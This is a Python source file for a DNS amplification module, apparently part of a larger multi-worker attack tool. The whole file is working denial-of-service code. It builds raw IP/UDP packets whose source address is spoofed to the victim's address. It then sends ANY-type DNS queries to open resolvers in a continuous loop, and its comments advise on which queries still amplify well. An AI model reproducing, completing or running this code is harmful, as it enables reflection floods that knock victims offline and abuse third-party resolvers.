import socket
import random
import struct
import time

from .base import BaseAttacker

class DNSAmplification(BaseAttacker):
    def __init__(self, args, config, stats, running, worker_id):
        super().__init__(args, config, stats, running, worker_id)
        self.dns_config = config.get('dns', {})
        # Resolvers come from config ONLY — never from --target
        self.resolvers = self.dns_config.get('dns_servers', [])
        if getattr(args, 'dns_resolvers_file', None):
            with open(args.dns_resolvers_file) as f:
                self.resolvers = [l.strip() for l in f if l.strip()
                                  and not l.startswith('#')]
        if not self.resolvers:
            raise ValueError(
                "DNS mode requires open resolvers in config.yaml "
                "(dns.dns_servers) or --dns-resolvers-file")

    def _build_dns_query(self, domain):
        tid = random.randint(0, 65535)
        flags = 0x0100  # RD=1
        header = struct.pack('!HHHHHH', tid, flags, 1, 0, 0, 0)

        qname = b''
        for part in domain.split('.'):
            qname += struct.pack('B', len(part)) + part.encode()
        qname += b'\x00'

        # ANY (255) still amplifies on many legacy resolvers;
        # consider 'isc.org' + TXT for modern testing
        qtype = struct.pack('!H', 255)
        qclass = struct.pack('!H', 1)
        return header + qname + qtype + qclass

    def _checksum(self, msg):
        s = 0
        for i in range(0, len(msg), 2):
            w = (msg[i] << 8) + (msg[i + 1] if i + 1 < len(msg) else 0)
            s += w
        s = (s >> 16) + (s & 0xffff)
        s = ~s & 0xffff
        return s

    def _build_spoofed_packet(self, query, resolver_ip, src_port):
        """Raw IP + UDP packet with src = victim, dst = resolver."""
        udp_len = 8 + len(query)
        udp_header = struct.pack('!HHHH', src_port, 53, udp_len, 0)

        src_ip = socket.inet_aton(self.target)
        dst_ip = socket.inet_aton(resolver_ip)
        psh = struct.pack('!4s4sBBH', src_ip, dst_ip, 0,
                          socket.IPPROTO_UDP, udp_len) + udp_header + query
        udp_check = self._checksum(psh)
        udp_header = struct.pack('!HHHH', src_port, 53, udp_len, udp_check)

        ip_header = struct.pack('!BBHHHBBH4s4s',
            (4 << 4) + 5, 0, 20 + udp_len, random.randint(0, 65535), 0,
            64, socket.IPPROTO_UDP, 0, src_ip, dst_ip)

        return ip_header + udp_header + query

    def attack(self):
        domain = self.dns_config.get('amplification_domain', 'isc.org')
        query = self._build_dns_query(domain)

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            print(f"[!] Worker {self.worker_id}: DNS amplification requires root "
                  f"(raw sockets for source spoofing)")
            return

        try:
            while self.running.value:
                try:
                    resolver = random.choice(self.resolvers)
                    src_port = random.randint(1024, 65535)
                    packet = self._build_spoofed_packet(query, resolver, src_port)
                    sock.sendto(packet, (resolver, 53))
                    # Bytes the VICTIM will receive is what matters for
                    # amplification; approximate with query size here and
                    # let config's amplification factor describe the rest
                    self._count(sent=1, size=len(packet))
                except Exception:
                    self._count(failed=1)
                    time.sleep(0.01)
                self._pace()
        finally:
            try:
                sock.close()
            except Exception:
                pass
            self.finalize()